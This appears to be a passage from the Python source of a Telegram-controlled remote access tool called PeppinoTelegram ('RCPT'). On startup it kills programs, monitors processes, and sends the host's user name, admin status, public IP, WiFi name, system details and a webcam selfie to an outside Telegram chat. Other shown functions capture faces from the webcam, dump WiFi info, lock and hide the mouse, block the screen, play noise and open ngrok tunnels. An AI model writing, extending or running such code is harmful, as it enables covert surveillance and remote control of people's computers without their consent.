        STARTING_LOG_MESSAGE.edit("🖼️ GOT IMAGES")

        self.update_commands()
        STARTING_LOG_MESSAGE.edit("⚙️ GOT COMMANDS")

        nomemes = list(self.images.copy().keys())
        self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))

        self.audios = load_audios()
        STARTING_LOG_MESSAGE.edit("🎵 AUDIOS LOADED")

        curr_wallpaper_path = get_current_wallpaper()
        if curr_wallpaper_path:
            self.backup_wallpaper_path = join(BURN_DIRECTORY, curr_wallpaper_path)
            STARTING_LOG_MESSAGE.edit("🖼️ WALLPAPER BACKED UP")
        else:
            self.backup_wallpaper_path = None
            STARTING_LOG_MESSAGE.edit("🚫🖼️ WALLPAPER NOT BACKED UP")

        self.cantopenthread = Thread(target=self.cantopenkiller)
        self.cantopenthread.start()
        STARTING_LOG_MESSAGE.edit("💀 PROGRAM KILLER STARTED")

        self.processmonthread = Thread(target=self.processmonitorloop)
        self.processmonthread.start()
        STARTING_LOG_MESSAGE.edit("📊 PROCESS MONITOR STARTED")

        self.connectioncheckerthread = Thread(target=self.connectioncheckerloop)
        self.connectioncheckerthread.start()

        self.screen_width, self.screen_height = pg.size()
        STARTING_LOG_MESSAGE.edit("🖥️ GOT SCREEN SIZE")

        STARTING_LOG_MESSAGE.edit("🌐 GETTING PUBLIC IP")
        public_ip = get_public_ip()
        STARTING_LOG_MESSAGE.edit("📋 GETTING BASIC INFO AND 📸 WEBCAM SELFIE")

        botstartedmessage = (
            "🚀 <b>RCPT Online – Ready</b> 🚀\n\n"
            f"🕒 <b>Started:</b> <code>{html.escape(now())}</code>\n"
            f"👤 <b>User:</b> <code>{html.escape(getlogin())}</code>\n"
            f"🛡️ <b>Admin:</b> <code>{'YES ✅' if self.has_admin else 'NO ❌'}</code>\n"
            f"🌐 <b>Public IP:</b> <code>{html.escape(public_ip)}</code>\n"
            f"📡 <b>WiFi:</b> <code>{html.escape(get_wifi_name())}</code>\n"
            f"📸 <b>Webcam:</b> <code>{html.escape(check_webcam())}</code>\n"
            f"💻 <b>OS:</b> <code>{platform.system()} {platform.release()} ({platform.machine()})</code>\n"
            f"🔋 <b>CPU Load:</b> <code>{psutil.cpu_percent():.1f}%</code> | <b>RAM:</b> <code>{psutil.virtual_memory().percent:.1f}%</code>\n\n"
            "🔥 <b>Bot is live</b> and ready to receive commands.\n"
            "Use /help or /menu to see available options."
        )

        try:
            self.selfie(
                caption=botstartedmessage,
                reply_markup=self.replyquickmenu()
            )
        except Exception as e:
            print(f"Startup selfie failed: {e}")

        #cleanup update
        self.bot.getUpdates(-1) #if the bot gets accidentally added to a group, which telepot can't handle, this will fix it
        loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
        loop.run_as_thread()
        STARTING_LOG_MESSAGE.edit("🔄 STARTED MESSAGE LOOP")
        STARTING_LOG_MESSAGE.delete() #Weeeeeeeeeeeee
        self.startupscript()
        while self.running:
            try:
                sleep(10)
            except KeyboardInterrupt:
                self.bsend("🛑 Interrupted by host machine, bye bye.")
                self.running = False

    def stop(self, confirm=True) -> None:
        print("Stopping bot")
        if confirm:
            stop = self.ask_yesno()
        else:
            stop = True
        if stop:
            self.running = False
            self.clear()
            self.bsend("🛑 Interrupted by you, bye bye.")
            self.stop_all_tunnels()
            reset_mouse_controller_and_visibility()
            sys.exit()
        else:
            self.operation_canceled()

    def test(self) -> None: #this is a test command used for test purpuses, can be used with /test
        print("Running test")
        message = """
        <b>Bold</b>
        <strong>Strong Bold</strong>

        <i>Italic</i>
        <em>Emphasis</em>

        <u>Underline</u>

        <s>Strikethrough</s>
        <del>Deleted Text</del>

        <tg-spoiler>Spoiler Text</tg-spoiler>

        <code>Inline code</code>

        <pre>Plain code block
        line 2
        line 3</pre>

        <pre><code class="language-python">
        def hello():
            print("Hello World")
        </code></pre>

        <a href="https://example.com">Clickable Link</a>

        <a href="tg://user?id=123456789">User Mention by ID</a>
        """
        self.bsendWithHtml(message)


    def update_commands(self) -> bool:
        print("Updating commands")
        commands = self.extract_commands()
        url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
        payload = {'commands': commands}
        response = requests.post(url, json=payload)
        response_json = response.json()
        ok, result = response_json.get("ok"), response_json.get("result")
        print(f"{'Commands updated' if ok else 'Commands NOT updated'}, Result: {result}")
        return response.status_code == 200

    def user_prompt(self, question: str, title="Question") -> str:
        msgid = self.bsendWithHtml(
            f"🗣️ <b>Asking</b>\n"
            f">&gt;&gt; <i>{html.escape(question)}</i>"
        )
        res = user_prompt(question, title)
        self.delete_message(msgid)
        self.bsendWithHtml(
            f"🗣️ <b>User Response</b>\n\n"
            f"<b>You:</b> <i>{html.escape(question)}</i>\n"
            f"<b>User:</b> <i>{html.escape(res)}</i>"
        )

        return res


    def waitforface(self, timeout=60):
        print(f"Waiting for face for {timeout} seconds")
        start = monotonic()
        self.opencap()
        cap = self.cap
        while monotonic()-start < timeout:
            res, frame = detect_face(cap)
            if frame is None:
                self.bsend("Face recognition model not loaded properly.")
                break
            if res:
                filename = randompngname()
                imwrite(filename, frame)
                self.__send_image(filename)
                remove(filename)
                break
        self.closecap()

    def wifiinfo(self) -> None:
        print("Getting WiFi info")
        self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")

    def wrapper_for_disturbed_overlay(self, timeout_seconds: int, custom_label=None, custom_oncancel=None) -> None:
        print(f"Starting VideoDisturbance overlay for {timeout_seconds} seconds")
        if  custom_label is None:
            custom_label = "🌀 Disturbance Overlay"
        if custom_oncancel is None:
            custom_oncancel = self.overlay_opencv.setstop
        bar = self.new_loading_bar_timed_worker(label=custom_label,
                                                duration=timeout_seconds,
                                                target=self.overlay_opencv.run_disturbance_effect,
                                                args=(timeout_seconds, ),
                                                on_cancel=custom_oncancel)
        if not bar: return
        bar.start()

    def wrapper_for_hide_cursor(self, timeout: int) -> None:
        print("Hiding cursor")
        se = Event()
        bar = self.new_loading_bar_timed_worker(
            label="🖱️ Hide Mouse Cursor",
            duration=timeout,
            target=lambda:...,
            on_cancel=se.set,
            on_complete=se.set,
            block_default_cancel=True
        )
        if not bar: return
        print("Hiding all cursor")
        hide_all_cursors()
        print("Enforcing mouse lock")
        Thread(target=enforce_lock, args=(se, )).start()
        bar.start()
        print("Resetting mouse controller and visibility.")
        reset_mouse_controller_and_visibility()#always ensuring this is done

    def wrapper_block_screen(self, timeout: int) -> None:
        bar = self.new_loading_bar_timed_worker(target=self.overlay_opencv.run_block_screen,
                                          label="🖥️🚫 Blocking Screen",
                                          duration=timeout,
                                          on_cancel=self.overlay_opencv.setstop,
                                          args=(timeout, )) 
        if not bar: return
        bar.start()

    def disturbed_overlay_and_random_noise(self, duration: int) -> None:
        print(f"Starting disturbed overlay and noise for {duration} seconds")
        t2 = Thread(target=self.audio_player.play_random_noise, args=(duration,))
        t2.start()
        self.wrapper_for_disturbed_overlay(duration,
                                      custom_label="🌀📡 Disturbance Overlay and noise",
                                      custom_oncancel=self.audio_player.stopallsounds)#, self.overlay_opencv.setstop()))
                                      #TODO Noise still does not stop
        t2.join()

"""
ooo        ooooo            o8o
`88.       .888'            `"'
 888b     d'888   .oooo.   oooo  ooo. .oo.   
 8 Y88. .P  888  `P  )88b  `888  `888P"Y88b  
 8  `888'   888   .oP"888   888   888   888  
 8    Y     888  d8(  888   888   888   888  
o8o        o888o `Y888""8o o888o o888o o888o 
"""

if __name__ == "__main__":
    print("Loading credentials")
    try:
        token, chat_id, ngrok_token, tunnel_provider = getCred() 
    except Exception as e:
        print(f"Error while loading credentials: {e}\n")
        sys.exit()
        """
        # If there is an error with the credentials this is the only way of knowing it
        with open(join(gettempdir(), "PEP2log.log"), "w") as fo:
            fo.write(traceback.format_exc())
            fo.write(str(e))
        """
    capture = VideoCapture(0)
    if logging:
        logger = DebugLogger()
        logger.activate()
    else:
        logger = None
    signal_error = ""
    if tunnel_provider == "ngrok":
        try:
            pyngrok.process.subprocess.Popen = _patched_popen
            try:
                if ngrok_token.strip():
                    terminate_process_by_name("ngrok.exe")
                    ngrok.set_auth_token(ngrok_token)
                    close_all_tunnels(ngrok)
            except pyngrok.exception.PyngrokNgrokError as e:
                    sleep(2)
                    terminate_process_by_name("ngrok.exe")
                    signal_error += f"Ngrok Error: {e}\n"
                    ngrok_token = None
        except Exception as e:
            signal_error += f"Unhandled exception: {e}\n"

    pep2 = PeppinoTelegram(token,chat_id,ngrok_token,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)

    # Use only if developer
    if GENERATE_COMMANDS_MD:
        try:
            import generate_commandsMD
            generate_commandsMD.main(pep2)
        except ImportError:
            pass
        sys.exit(0)
    # I wanted to make this multiple user but the code has become too hard to maintain.
    pep2.start()
